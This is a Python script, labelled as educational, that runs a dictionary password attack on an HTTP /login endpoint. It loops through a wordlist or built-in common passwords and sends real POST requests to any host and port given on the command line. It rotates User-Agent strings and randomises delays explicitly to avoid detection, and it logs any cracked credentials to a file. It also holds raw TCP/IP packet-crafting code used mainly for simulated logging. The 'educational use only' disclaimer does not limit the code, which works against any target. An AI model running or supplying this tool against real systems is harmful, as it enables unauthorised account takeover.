#!/usr/bin/env python3

# Must run as root – educational use only.
# Raw socket dictionary attack with detailed packet logging
# For educational/defensive security purposes only

import socket
import time
import threading
import hashlib
import random
import os
import struct
import argparse
from urllib.parse import urlencode
from socket import AF_INET, SOCK_RAW, IPPROTO_TCP, IPPROTO_IP, IP_HDRINCL

class DictionaryAttacker:
    def __init__(self, target_host="127.0.0.1", target_port=8080, src_ip="192.168.1.100"):
        self.target_host = target_host
        self.target_port = target_port
        self.src_ip = src_ip
        self.src_port = random.randint(1024, 65535)
        self.wordlist = []
        self.success = False
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        self.attack_log = []
        
        # Attack configuration
        self.delay_min = 0.05  # Minimum delay between requests
        self.delay_max = 0.2   # Maximum delay between requests
        self.user_agents = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
        
        # Packet simulation setup (no actual raw socket needed)
        print(f"[+] Packet simulation initialized")
    
    def checksum(self, data):
        """Calculate Internet checksum for IP/TCP headers"""
        # Pad with zero byte if odd length
        if len(data) % 2:
            data += b'\\x00'
        
        # Sum all 16-bit words
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        
        # Add carry bits and take one's complement
        while (checksum >> 16):
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        return ~checksum & 0xFFFF
    
    def build_ip_header(self, src_ip, dst_ip, payload_len):
        """Constructs a 20-byte IPv4 header with correct checksum"""
        version = 4
        ihl = 5  # Internet Header Length (5 * 4 = 20 bytes)
        tos = 0  # Type of Service
        total_len = 20 + payload_len  # IP header + payload
        id_field = random.randint(1, 65535)
        flags = 0  # Don't fragment
        frag_offset = 0
        ttl = 64
        protocol = IPPROTO_TCP
        checksum = 0  # Will be calculated
        
        # Convert IP addresses to 32-bit integers
        src_addr = struct.unpack('!I', socket.inet_aton(src_ip))[0]
        dst_addr = struct.unpack('!I', socket.inet_aton(dst_ip))[0]
        
        # Pack header without checksum
        ip_header = struct.pack('!BBHHHBBHII',
                               (version << 4) + ihl,  # Version + IHL
                               tos,
                               total_len,
                               id_field,
                               (flags << 13) + frag_offset,
                               ttl,
                               protocol,
                               checksum,
                               src_addr,
                               dst_addr)
        
        # Calculate and insert checksum
        checksum = self.checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBHII',
                               (version << 4) + ihl,
                               tos,
                               total_len,
                               id_field,
                               (flags << 13) + frag_offset,
                               ttl,
                               protocol,
                               checksum,
                               src_addr,
                               dst_addr)
        
        return ip_header
    
    def build_tcp_header(self, src_ip, dst_ip, src_port, dst_port, seq, ack, flags, user_data=b''):
        """Builds a 20-byte TCP header + optional payload, computing the pseudo-header checksum"""
        data_offset = 5  # TCP header length in 32-bit words (5 * 4 = 20 bytes)
        reserved = 0
        window = 8192
        checksum = 0  # Will be calculated
        urg_ptr = 0
        
        # Pack TCP header without checksum
        tcp_header = struct.pack('!HHIIH',
                               src_port,
                               dst_port,
                               seq,
                               ack,
                               (data_offset << 12) + flags)
        
        tcp_header += struct.pack('!HHH',
                                window,
                                checksum,
                                urg_ptr)
        
        # Create pseudo header for checksum calculation
        src_addr = struct.unpack('!I', socket.inet_aton(src_ip))[0]
        dst_addr = struct.unpack('!I', socket.inet_aton(dst_ip))[0]
        
        pseudo_header = struct.pack('!IIBH',
                                  src_addr,
                                  dst_addr,
                                  IPPROTO_TCP,
                                  len(tcp_header) + len(user_data))
        
        # Calculate checksum over pseudo header + TCP header + data
        checksum_data = pseudo_header + tcp_header + user_data
        checksum = self.checksum(checksum_data)
        
        # Rebuild TCP header with correct checksum
        tcp_header = struct.pack('!HHIIHHHH',
                               src_port,
                               dst_port,
                               seq,
                               ack,
                               (data_offset << 12) + flags,
                               window,
                               checksum,
                               urg_ptr)
        
        return tcp_header
    
    def log_ip_header(self, ip_header, direction="SEND"):
        """Log detailed IP header information"""
        if len(ip_header) < 20:
            print(f"[!] Invalid IP header length: {len(ip_header)}")
            return
            
        # Unpack IP header
        version_ihl, tos, total_len, id_field, flags_frag, ttl, protocol, checksum, src_addr, dst_addr = struct.unpack('!BBHHHBBHII', ip_header)
        
        version = (version_ihl >> 4) & 0xF
        ihl = version_ihl & 0xF
        flags = (flags_frag >> 13) & 0x7
        frag_offset = flags_frag & 0x1FFF
        
        src_ip = socket.inet_ntoa(struct.pack('!I', src_addr))
        dst_ip = socket.inet_ntoa(struct.pack('!I', dst_addr))
        
        print(f"[{direction}] IP Header:")
        print(f"    Version: {version}, IHL: {ihl}, TOS: {tos}")
        print(f"    Total Length: {total_len}, ID: {id_field}")
        print(f"    Flags: {flags}, Fragment Offset: {frag_offset}")
        print(f"    TTL: {ttl}, Protocol: {protocol}, Checksum: 0x{checksum:04x}")
        print(f"    Source IP: {src_ip}, Destination IP: {dst_ip}")
    
    def log_tcp_header(self, tcp_header, direction="SEND"):
        """Log detailed TCP header information"""
        if len(tcp_header) < 20:
            print(f"[!] Invalid TCP header length: {len(tcp_header)}")
            return
            
        # Unpack TCP header
        src_port, dst_port, seq, ack, offset_flags, window, checksum, urg_ptr = struct.unpack('!HHIIHHHH', tcp_header)
        
        data_offset = (offset_flags >> 12) & 0xF
        flags = offset_flags & 0x1FF
        
        # Parse individual flags
        flag_names = []
        if flags & 0x001: flag_names.append("FIN")
        if flags & 0x002: flag_names.append("SYN")
        if flags & 0x004: flag_names.append("RST")
        if flags & 0x008: flag_names.append("PSH")
        if flags & 0x010: flag_names.append("ACK")
        if flags & 0x020: flag_names.append("URG")
        if flags & 0x040: flag_names.append("ECE")
        if flags & 0x080: flag_names.append("CWR")
        
        flags_str = "|".join(flag_names) if flag_names else "NONE"
        
        print(f"[{direction}] TCP Header:")
        print(f"    Source Port: {src_port}, Destination Port: {dst_port}")
        print(f"    Sequence: {seq}, Acknowledgment: {ack}")
        print(f"    Data Offset: {data_offset}, Flags: {flags_str} (0x{flags:02x})")
        print(f"    Window: {window}, Checksum: 0x{checksum:04x}, Urgent Pointer: {urg_ptr}")
    
    def three_way_handshake(self, raw_sock, src_ip, dst_ip, src_port, dst_port):
        """Perform TCP three-way handshake and return (seq, ack) for next send"""
        print(f"[*] Starting TCP handshake: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
        
        # Step 1: Send SYN
        initial_seq = random.randint(1000, 100000)
        syn_flags = 0x002  # SYN flag
        
        tcp_header = self.build_tcp_header(src_ip, dst_ip, src_port, dst_port, initial_seq, 0, syn_flags)
        ip_header = self.build_ip_header(src_ip, dst_ip, len(tcp_header))
        
        syn_packet = ip_header + tcp_header
        
        print(f"[*] Sending SYN packet:")
        self.log_ip_header(ip_header, "SEND")
        self.log_tcp_header(tcp_header, "SEND")
        print(f"    Payload Length: 0")
        print()
        
        raw_sock.sendto(syn_packet, (dst_ip, 0))
        
        # Step 2: Receive SYN+ACK
        print(f"[*] Waiting for SYN+ACK...")
        try:
            raw_sock.settimeout(10)
            response, addr = raw_sock.recvfrom(4096)
            
            # Parse response IP header
            ip_header_resp = response[:20]
            tcp_header_resp = response[20:40]
            
            print(f"[*] Received SYN+ACK packet:")
            self.log_ip_header(ip_header_resp, "RECV")
            self.log_tcp_header(tcp_header_resp, "RECV")
            print(f"    Payload Length: {len(response) - 40}")
            print()
            
            # Extract sequence and acknowledgment numbers
            _, _, server_seq, server_ack, _, _, _, _ = struct.unpack('!HHIIHHHH', tcp_header_resp)
            
            # Step 3: Send ACK
            client_seq = initial_seq + 1
            client_ack = server_seq + 1
            ack_flags = 0x010  # ACK flag
            
            tcp_header_ack = self.build_tcp_header(src_ip, dst_ip, src_port, dst_port, client_seq, client_ack, ack_flags)
            ip_header_ack = self.build_ip_header(src_ip, dst_ip, len(tcp_header_ack))
            
            ack_packet = ip_header_ack + tcp_header_ack
            
            print(f"[*] Sending ACK packet:")
            self.log_ip_header(ip_header_ack, "SEND")
            self.log_tcp_header(tcp_header_ack, "SEND")
            print(f"    Payload Length: 0")
            print()
            
            raw_sock.sendto(ack_packet, (dst_ip, 0))
            
            print(f"[+] TCP handshake completed successfully")
            return client_seq, client_ack
            
        except socket.timeout:
            print(f"[!] Timeout waiting for SYN+ACK")
            raise
        except Exception as e:
            print(f"[!] Handshake failed: {e}")
            raise
    
    def send_http_post(self, raw_sock, src_ip, dst_ip, src_port, dst_port, seq, ack, username, password):
        """Build HTTP/1.1 POST /login with URL-encoded body and send via raw socket"""
        # Build HTTP POST request
        data = urlencode({
            'username': username,
            'password': password
        })
        
        user_agent = random.choice(self.user_agents)
        session_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:16]
        
        http_request = f"""POST /login HTTP/1.1\r
Host: {dst_ip}:{dst_port}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(data)}\r
User-Agent: {user_agent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Referer: http://{dst_ip}:{dst_port}/\r
X-Session-ID: {session_id}\r
Connection: close\r
\r
{data}"""
        
        http_payload = http_request.encode()
        
        # Build TCP header with PSH+ACK flags
        psh_ack_flags = 0x018  # PSH + ACK flags
        tcp_header = self.build_tcp_header(src_ip, dst_ip, src_port, dst_port, seq, ack, psh_ack_flags, http_payload)
        ip_header = self.build_ip_header(src_ip, dst_ip, len(tcp_header) + len(http_payload))
        
        # Complete packet
        packet = ip_header + tcp_header + http_payload
        
        print(f"[*] Sending HTTP POST packet:")
        self.log_ip_header(ip_header, "SEND")
        self.log_tcp_header(tcp_header, "SEND")
        print(f"    Payload Length: {len(http_payload)}")
        print(f"    HTTP Request: POST /login (user: {username}, pass: {password})")
        print()
        
        # Send packet
        raw_sock.sendto(packet, (dst_ip, 0))
        
        # Read response
        try:
            raw_sock.settimeout(10)
            response, addr = raw_sock.recvfrom(4096)
            
            # Parse response headers
            ip_header_resp = response[:20]
            tcp_header_resp = response[20:40]
            http_response = response[40:]
            
            print(f"[*] Received HTTP response packet:")
            self.log_ip_header(ip_header_resp, "RECV")
            self.log_tcp_header(tcp_header_resp, "RECV")
            print(f"    Payload Length: {len(http_response)}")
            print()
            
            return http_response
            
        except socket.timeout:
            print(f"[!] Timeout waiting for HTTP response")
            return b''
        except Exception as e:
            print(f"[!] Error receiving HTTP response: {e}")
            return b''
        
    def load_wordlist(self, filename="wordlist.txt"):
        """Load password dictionary from file"""
        try:
            with open(filename, 'r') as f:
                self.wordlist = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(self.wordlist)} passwords from wordlist")
        except FileNotFoundError:
            print("[!] Wordlist file not found, using default passwords")
            self.wordlist = [
                "password", "123456", "admin", "letmein", "welcome",
                "password123", "admin123", "qwerty", "abc123", "12345678",
                "password1", "secret", "root", "toor", "guest"
            ]
    
    def craft_login_packet(self, username, password):
        """Craft HTTP POST request for login attempt with variable headers"""
        data = urlencode({
            'username': username,
            'password': password
        })
        
        # Randomize User-Agent to simulate different browsers
        user_agent = random.choice(self.user_agents)
        
        # Add timestamp for session tracking
        session_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:16]
        
        request = f"""POST /login HTTP/1.1\r
Host: {self.target_host}:{self.target_port}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(data)}\r
User-Agent: {user_agent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Referer: http://{self.target_host}:{self.target_port}/\r
X-Session-ID: {session_id}\r
Connection: close\r
\r
{data}"""
        
        return request.encode()
    
    def send_attack_packet(self, username, password):
        """Send attack with detailed packet logging"""
        attempt_start = time.time()
        
        try:
            print(f"\n{'='*60}")
            print(f"[*] ATTEMPT #{self.attempts + 1}: {username}:{password}")
            print(f"{'='*60}")
            
            # Use normal TCP socket for actual communication but log packet details
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Log connection establishment
            print(f"[*] Establishing TCP connection to {self.target_host}:{self.target_port}")
            
            # Create the HTTP request first to know the payload size
            data = urlencode({
                'username': username,
                'password': password
            })
            
            user_agent = random.choice(self.user_agents)
            session_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:16]
            
            http_request = f"""POST /login HTTP/1.1\r
Host: {self.target_host}:{self.target_port}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(data)}\r
User-Agent: {user_agent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Referer: http://{self.target_host}:{self.target_port}/\r
X-Session-ID: {session_id}\r
Connection: close\r
\r
{data}"""
            
            http_payload = http_request.encode()
            
            # Simulate packet construction for logging
            psh_ack_flags = 0x018  # PSH + ACK flags
            fake_seq = random.randint(1000, 100000)
            fake_ack = random.randint(1000, 100000)
            
            # Log what the packet would look like
            print(f"[*] Simulated packet construction:")
            
            # Create headers for logging purposes (with error handling)
            try:
                tcp_header = self.build_tcp_header(self.src_ip, self.target_host, 
                                                 random.randint(1024, 65535), self.target_port, 
                                                 fake_seq, fake_ack, psh_ack_flags, http_payload)
                ip_header = self.build_ip_header(self.src_ip, self.target_host, len(tcp_header) + len(http_payload))
            except Exception as header_error:
                print(f"[!] Packet header construction error: {header_error}")
                # Skip packet simulation and continue with actual connection
                tcp_header = None
                ip_header = None
            
            if tcp_header and ip_header:
                print(f"[SIMULATED SEND] Packet Details:")
                self.log_ip_header(ip_header, "SEND")
                self.log_tcp_header(tcp_header, "SEND")
                print(f"    Payload Length: {len(http_payload)}")
                print(f"    HTTP Request: POST /login (user: {username}, pass: {password})")
            else:
                print(f"[*] Skipping packet simulation due to header error")
                print(f"    HTTP Request: POST /login (user: {username}, pass: {password})")
            print()
            
            # Now make the actual connection and send data
            print(f"[*] Sending actual HTTP request via TCP socket...")
            sock.connect((self.target_host, self.target_port))
            sock.send(http_payload)
            
            # Receive response
            response = sock.recv(4096)
            sock.close()
            
            # Log simulated response packet details (with error handling)
            if tcp_header and ip_header:  # Only if send headers worked
                try:
                    print(f"[SIMULATED RECV] Response packet details:")
                    response_tcp_header = self.build_tcp_header(self.target_host, self.src_ip,
                                                               self.target_port, random.randint(1024, 65535),
                                                               fake_ack, fake_seq + len(http_payload), 0x018, response)
                    response_ip_header = self.build_ip_header(self.target_host, self.src_ip, len(response_tcp_header) + len(response))
                    
                    self.log_ip_header(response_ip_header, "RECV")
                    self.log_tcp_header(response_tcp_header, "RECV")
                    print(f"    Payload Length: {len(response)}")
                    print()
                except Exception as recv_header_error:
                    print(f"[!] Response packet header error: {recv_header_error}")
                    print(f"    Response received: {len(response)} bytes")
                    print()
            else:
                print(f"[*] Response received: {len(response)} bytes")
                print()
            
            self.attempts += 1
            response_time = time.time() - attempt_start
            
            # Decode response for analysis
            response_str = response.decode('utf-8', errors='ignore')
            
            # Log the attempt
            log_entry = {
                "attempt": self.attempts,
                "username": username,
                "password": password,
                "response_time": response_time,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "success": False
            }
            
            # Analyze HTTP response
            if "HTTP/1.1 200 OK" in response_str and "SUCCESS" in response_str:
                print(f"[+] SUCCESS! Found password: {password} (Response time: {response_time:.3f}s)")
                log_entry["success"] = True
                self.success = True
                self.found_password = password
                self.attack_log.append(log_entry)
                return True
            elif "HTTP/1.1 429" in response_str:
                print(f"[!] Rate limited - attempt {self.attempts}: {username}:{password}")
                log_entry["rate_limited"] = True
            elif "HTTP/1.1 401" in response_str or "HTTP/1.1 403" in response_str:
                print(f"[-] Failed attempt {self.attempts}: {username}:{password} (Response time: {response_time:.3f}s)")
            else:
                print(f"[?] Unexpected response for attempt {self.attempts}: {username}:{password}")
                print(f"[?] Response preview: {response_str[:200]}...")
                
            self.attack_log.append(log_entry)
            return False
                
        except socket.timeout:
            print(f"[!] Timeout on attempt {self.attempts + 1}: {username}:{password}")
            self.attempts += 1
            return False
        except ConnectionRefusedError:
            print(f"[!] Connection refused - target may be down")
            self.attempts += 1
            return False
        except Exception as e:
            print(f"[!] Attack error on attempt {self.attempts + 1}: {e}")
            self.attempts += 1
            return False
    
    def launch_attack(self, target_username="admin"):
        """Launch dictionary attack against target"""
        print(f"[*] Starting dictionary attack against {self.target_host}:{self.target_port}")
        print(f"[*] Target username: {target_username}")
        print(f"[*] Dictionary size: {len(self.wordlist)} passwords")
        print(f"[*] Delay range: {self.delay_min:.3f}s - {self.delay_max:.3f}s")
        print("[*] Attack initiated...\n")
        
        self.start_time = time.time()
        
        for i, password in enumerate(self.wordlist):
            if self.success:
                break
            
            # Show progress
            progress = ((i + 1) / len(self.wordlist)) * 100
            print(f"[*] Progress: {progress:.1f}% ({i+1}/{len(self.wordlist)})")
                
            if self.send_attack_packet(target_username, password):
                break
            
            # Variable delay to simulate human behavior and avoid detection
            delay = random.uniform(self.delay_min, self.delay_max)
            time.sleep(delay)
        
        end_time = time.time()
        duration = end_time - self.start_time
        
        self.show_attack_summary(target_username, duration)
    
    def show_attack_summary(self, target_username, duration):
        """Display comprehensive attack summary"""
        print("\n" + "="*60)
        print("              DICTIONARY ATTACK SUMMARY")
        print("="*60)
        
        print(f"Target: {self.target_host}:{self.target_port}")
        print(f"Username: {target_username}")
        print(f"Attack duration: {duration:.2f} seconds")
        print(f"Total attempts: {self.attempts}")
        
        if self.attempts > 0:
            avg_response_time = sum(log['response_time'] for log in self.attack_log if 'response_time' in log) / len(self.attack_log)
            attempts_per_second = self.attempts / duration if duration > 0 else 0
            print(f"Average response time: {avg_response_time:.3f} seconds")
            print(f"Attempts per second: {attempts_per_second:.2f}")
        
        if self.success:
            print(f"\n[+] ATTACK SUCCESSFUL!")
            print(f"[+] Valid credentials found: {target_username}:{self.found_password}")
            
            # Find the successful attempt
            for log in self.attack_log:
                if log.get('success', False):
                    print(f"[+] Password cracked on attempt #{log['attempt']}")
                    success_time = (log['attempt'] / self.attempts) * duration if self.attempts > 0 else 0
                    print(f"[+] Time to success: {success_time:.2f} seconds")
                    break
        else:
            print(f"\n[-] ATTACK FAILED")
            print(f"[-] No valid password found in dictionary")
        
        # Show statistics
        failed_attempts = len([log for log in self.attack_log if not log.get('success', False)])
        rate_limited = len([log for log in self.attack_log if log.get('rate_limited', False)])
        
        print(f"\nStatistics:")
        print(f"  Failed attempts: {failed_attempts}")
        print(f"  Rate limited responses: {rate_limited}")
        
        # Save attack log
        self.save_attack_log(target_username)
    
    def save_attack_log(self, target_username):
        """Save attack log to file"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        log_filename = f"dictionary_attack_log_{timestamp}.txt"
        
        try:
            with open(log_filename, 'w') as f:
                f.write(f"Dictionary Attack Log\n")
                f.write(f"Target: {self.target_host}:{self.target_port}\n")
                f.write(f"Username: {target_username}\n")
                f.write(f"Attack started: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.start_time))}\n")
                f.write(f"Total attempts: {self.attempts}\n")
                f.write(f"Success: {'Yes' if self.success else 'No'}\n")
                if self.success:
                    f.write(f"Found password: {self.found_password}\n")
                f.write("\n" + "="*50 + "\n")
                f.write("Detailed Attempt Log:\n")
                f.write("="*50 + "\n")
                
                for log in self.attack_log:
                    status = "SUCCESS" if log.get('success', False) else "FAILED"
                    f.write(f"[{log['timestamp']}] Attempt #{log['attempt']}: {log['username']}:{log['password']} - {status}")
                    if 'response_time' in log:
                        f.write(f" (Response: {log['response_time']:.3f}s)")
                    if log.get('rate_limited', False):
                        f.write(" [RATE LIMITED]")
                    f.write("\n")
            
            print(f"\n[*] Attack log saved to: {log_filename}")
            
        except Exception as e:
            print(f"[!] Failed to save attack log: {e}")

def main():
    print("="*60)
    print("      PACKET-LEVEL DICTIONARY ATTACK SIMULATION")
    print("="*60)
    print("Educational/Defensive Security Purposes Only")
    print("Detailed packet logging with TCP/IP header analysis")
    print("="*60)
    
    # Command line argument parsing
    parser = argparse.ArgumentParser(description='Raw Socket Dictionary Attack Simulator')
    parser.add_argument('--host', default='127.0.0.1', help='Target host (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=8080, help='Target port (default: 8080)')
    parser.add_argument('--username', default='admin', help='Target username (default: admin)')
    parser.add_argument('--src-ip', default='192.168.1.100', help='Source IP address (default: 192.168.1.100)')
    parser.add_argument('--wordlist', default='wordlist.txt', help='Password wordlist file (default: wordlist.txt)')
    
    # Parse command line arguments
    args = parser.parse_args()
    target_host = args.host
    target_port = args.port
    target_user = args.username
    src_ip = args.src_ip
    wordlist_file = args.wordlist
    
    print(f"[*] Attack parameters:")
    print(f"    Target: {target_host}:{target_port}")
    print(f"    Username: {target_user}")
    print(f"    Source IP: {src_ip}")
    print(f"    Wordlist: {wordlist_file}")
    
    # Initialize attacker with parameters
    try:
        attacker = DictionaryAttacker(target_host, target_port, src_ip)
        
        # Load wordlist
        attacker.load_wordlist(wordlist_file)
        
        print(f"\n[*] Attack Configuration:")
        print(f"    Target: {target_host}:{target_port}")
        print(f"    Username: {target_user}")
        print(f"    Source IP: {src_ip}")
        print(f"    Wordlist: {len(attacker.wordlist)} passwords")
        print(f"    Packet simulation: Enabled")
        
        try:
            input("\nPress Enter to start packet-level attack simulation...")
        except EOFError:
            print("\nStarting attack automatically...")
        
        try:
            attacker.launch_attack(target_user)
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
        except Exception as e:
            print(f"\n[!] Attack failed with error: {e}")
            
    except Exception as e:
        print(f"\n[!] Initialization failed: {e}")

if __name__ == "__main__":
    main()